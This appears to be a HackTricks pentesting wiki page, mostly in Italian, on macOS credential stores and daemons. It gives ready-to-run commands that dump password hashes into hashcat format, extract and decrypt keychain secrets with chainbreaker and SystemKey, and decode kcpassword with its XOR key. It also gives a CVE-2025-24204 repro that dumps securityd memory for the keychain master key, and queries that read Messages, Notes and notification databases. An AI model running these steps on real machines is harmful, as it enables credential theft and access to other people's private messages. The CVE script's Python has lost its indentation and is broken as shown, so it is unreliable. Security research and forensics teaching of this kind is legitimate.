# macOS Sensitive Locations & Interesting Daemons

{{#include ../../../banners/hacktricks-training.md}}

## Password

### Password shadow

La shadow password è memorizzata con la configurazione dell'utente in plist situati in **`/var/db/dslocal/nodes/Default/users/`**.\
La seguente one-liner può essere usata per dumpare **tutte le informazioni sugli utenti** (incluse le informazioni sugli hash):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Script come questo**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) o [**questo**](https://github.com/octomagon/davegrohl.git) possono essere usati per trasformare l'hash nel **formato** **hashcat**.

Un'alternativa in una sola riga che stamperà le credenziali di tutti gli account non di servizio nel formato hashcat `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Un altro modo per ottenere il `ShadowHashData` di un utente è usare `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Questo file viene **usato solo** quando il sistema si avvia in **single-user mode** (quindi non molto frequentemente).

### Keychain Dump

Nota che quando si usa il binary security per **dump the passwords decrypted**, verranno mostrati diversi prompt che chiederanno all'utente di consentire questa operazione.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
Nei moderni macOS gli backing store più interessanti sono di solito **`~/Library/Keychains/login.keychain-db`** e **`/Library/Keychains/System.keychain`**. Sono file basati su SQLite, ma l'accesso in chiaro è ancora mediato da **`securityd`**: rubare il DB grezzo ti dà soprattutto metadati e blob cifrati, a meno che tu non recuperi anche la password dell'utente, `SystemKey`, o una master key in memoria.

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) it looks like these tools aren't working anymore in Big Sur.

### Panoramica di Keychaindump

Un tool chiamato **keychaindump** è stato sviluppato per estrarre password dai keychain di macOS, ma incontra limitazioni nelle versioni più recenti di macOS come Big Sur, come indicato in una [discussione](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). L'uso di **keychaindump** richiede che l'attaccante ottenga accesso e faccia privilege escalation fino a **root**. Il tool sfrutta il fatto che il keychain viene sbloccato per impostazione predefinita al login dell'utente per comodità, consentendo alle applicazioni di accedervi senza richiedere ripetutamente la password dell'utente. Tuttavia, se un utente sceglie di bloccare il proprio keychain dopo ogni utilizzo, **keychaindump** diventa inefficace.

**keychaindump** funziona prendendo di mira uno specifico processo chiamato **securityd**, descritto da Apple come un daemon per operazioni di autorizzazione e crittografiche, fondamentale per accedere al keychain. Il processo di estrazione prevede l'identificazione di una **Master Key** derivata dalla password di login dell'utente. Questa chiave è essenziale per leggere il file del keychain. Per individuare la **Master Key**, **keychaindump** scansiona l'heap di memoria di **securityd** usando il comando `vmmap`, cercando possibili chiavi all'interno di aree contrassegnate come `MALLOC_TINY`. Il seguente comando viene usato per ispezionare queste posizioni di memoria:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Dopo aver identificato potenziali master key, **keychaindump** cerca tra gli heap uno specifico pattern (`0x0000000000000018`) che indica un candidato per la master key. Sono necessari ulteriori passaggi, inclusa la deobfuscation, per utilizzare questa key, come descritto nel codice sorgente di **keychaindump**. Gli analisti che si concentrano su quest’area dovrebbero notare che i dati cruciali per decrypting il keychain sono memorizzati nella memoria del processo **securityd**. Un esempio di comando per eseguire **keychaindump** è:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) può essere usato per estrarre i seguenti tipi di informazioni da un OSX keychain in modo forensically sound:

- Hashed Keychain password, adatta al cracking con [hashcat](https://hashcat.net/hashcat/) o [John the Ripper](https://www.openwall.com/john/)
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Dato la password di sblocco del keychain, una master key ottenuta usando [volafox](https://github.com/n0fate/volafox) o [volatility](https://github.com/volatilityfoundation/volatility), oppure un unlock file come SystemKey, Chainbreaker fornirà anche password in plaintext.

Senza uno di questi metodi per sbloccare il Keychain, Chainbreaker mostrerà tutte le altre informazioni disponibili.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) con SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump delle chiavi del portachiavi (con password) craccando l'hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) with memory dump**

[Segui questi passaggi](../index.html#dumping-memory-with-osxpmem) per eseguire un **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) using users password**

Se conosci la password dell'utente puoi usarla per **dumpare e decriptare i keychain che appartengono all'utente**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Chiave master del Keychain tramite entitlement `gcore` (CVE-2025-24204)

macOS 15.0 (Sequoia) ha distribuito `/usr/bin/gcore` con l’entitlement **`com.apple.system-task-ports.read`**, quindi qualsiasi amministratore locale (o app firmata malevola) poteva dumpare **la memoria di qualunque processo anche con SIP/TCC applicati**. Dumpare `securityd` leak la **chiave master del Keychain** in chiaro e consente di decrittare `login.keychain-db` senza la password dell’utente.

**Quick repro su build vulnerabili (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Feed the extracted hex key to Chainbreaker (`--key <hex>`) to decrypt the login keychain. Apple ha rimosso l'entitlement in **macOS 15.3+**, quindi questo funziona solo su build di Sequoia non patchate o su sistemi che hanno mantenuto il binary vulnerabile.

### kcpassword

Il file **kcpassword** è un file che contiene la **user’s login password**, ma solo se il system owner ha **abilitato l'auto login**. Quindi, l'utente verrà eseguito automaticamente il login senza essere chiesto di inserire una password (il che non è molto sicuro).

La password è memorizzata nel file **`/etc/kcpassword`** xorata con la key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Se la password dell'utente è più lunga della key, la key verrà riutilizzata.\
Questo rende la password piuttosto facile da recuperare, ad esempio usando script come [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesting Information in Databases

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

Prima di **Sequoia**, di solito puoi trovare lo store di Notification Center in **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. In **Sequoia+** Apple lo ha spostato nel group container protetto da TCC **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

La maggior parte delle informazioni interessanti è memorizzata all’interno di colonne **blob**, quindi dovrai estrarre quel contenuto e trasformarlo in qualcosa di leggibile dall’uomo (`plutil -p -`, `strings`, oppure un piccolo parser). Esempi rapidi di triage:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Recent privacy issues (NotificationCenter DB)

- In macOS **14.7–15.1** Apple stored banner content in the `db2/db` SQLite without proper redaction. CVEs **CVE-2024-44292/44293/40838/54504** allowed any local user to read other users' notification text just by opening the DB (no TCC prompt).
- Apple ha mitigato questo spostando il DB in `group.com.apple.usernoted` e proteggendolo con TCC nelle build più recenti di Sequoia, quindi sui sistemi attuali di solito serve il contesto utente corretto o un TCC bypass per leggerlo.
- On legacy endpoints, copy the `db`, `db-wal`, and `db-shm` files together before updating or rebooting if you want to preserve the artefacts.

### Notes

The users **notes** can be found in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Se la one-liner sopra è troppo rumorosa, esporta `ZICNOTEDATA.ZDATA`, esegui `gunzip` su di esso e fai il parsing del protobuf: di solito questo è più affidabile che eseguire `strings` direttamente sul file SQLite.

### Background Tasks / Login Items

Da **Ventura**, i login items approvati dall’utente e diversi background tasks sono tracciati negli store **BTM** come **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** e nella cache di sistema versionata **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Questi file sono utili per identificare rapidamente persistence, helper tools e alcuni background items gestiti da MDM:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Per l’angolo della persistence e i dettagli interni di BTM, consulta [la pagina delle auto-start locations](../../macos-auto-start-locations.md#login-items) e [le note su Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Preferences

In macOS le preferences delle app si trovano in **`$HOME/Library/Preferences`** e in iOS in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

In macOS lo strumento cli **`defaults`** può essere usato per **modificare il file Preferences**.

**`/usr/sbin/cfprefsd`** rivendica i servizi XPC `com.apple.cfprefsd.daemon` e `com.apple.cfprefsd.agent` e può essere chiamato per eseguire azioni come modificare le preferences.

## OpenDirectory permissions.plist

Il file `/System/Library/OpenDirectory/permissions.plist` contiene i permessi applicati agli attributi dei nodi ed è protetto da SIP.\
Questo file concede permessi a utenti specifici tramite UUID (e non uid) così da consentire loro di accedere a informazioni sensibili specifiche come `ShadowHashData`, `HeimdalSRPKey` e `KerberosKeys` tra le altre:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## System Notifications

### Darwin Notifications

Il daemon principale per le notifiche è **`/usr/sbin/notifyd`**. Per ricevere notifiche, i client devono registrarsi tramite il Mach port `com.apple.system.notification_center` (controllali con `sudo lsmp -p <pid notifyd>`). Il daemon è configurabile con il file `/etc/notify.conf`.

I nomi usati per le notifiche sono notazioni DNS inverse univoche e, quando una notifica viene inviata a uno di essi, il/i client che hanno indicato di poterla gestire la riceveranno.

È possibile fare il dump dello stato attuale (e vedere tutti i nomi) inviando il segnale SIGUSR2 al processo notifyd e leggendo il file generato: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

Il **Distributed Notification Center**, il cui binario principale è **`/usr/sbin/distnoted`**, è un altro modo per inviare notifiche. Espone alcuni servizi XPC ed esegue alcuni controlli per cercare di verificare i client.

### Apple Push Notifications (APN)

In questo caso, le applicazioni possono registrarsi per **topics**. Il client genererà un token contattando i server di Apple tramite **`apsd`**.\
Poi, i provider avranno anch’essi generato un token e potranno connettersi ai server di Apple per inviare messaggi ai client. Questi messaggi saranno ricevuti localmente da **`apsd`**, che inoltrerà la notifica all’applicazione in attesa.

Le preferenze si trovano in `/Library/Preferences/com.apple.apsd.plist`.

Esiste un database locale dei messaggi situato in macOS in `/Library/Application\ Support/ApplePushService/aps.db` e in iOS in `/var/mobile/Library/ApplePushService`. Ha 3 tabelle: `incoming_messages`, `outgoing_messages` e `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
È anche possibile ottenere informazioni sul daemon e sulle connessioni usando:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## User Notifications

Queste sono le notifiche che l'utente dovrebbe vedere sullo schermo:

- **`CFUserNotification`**: Queste API forniscono un modo per mostrare sullo schermo un pop-up con un messaggio.
- **The Bulletin Board**: Questo mostra in iOS un banner che scompare e verrà memorizzato nel Notification Center.
- **`NSUserNotificationCenter`**: Questo è il Bulletin Board di iOS in MacOS. Nelle versioni più vecchie di macOS il database di solito si trova in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; su Sequoia+ è stato spostato in `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## References

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
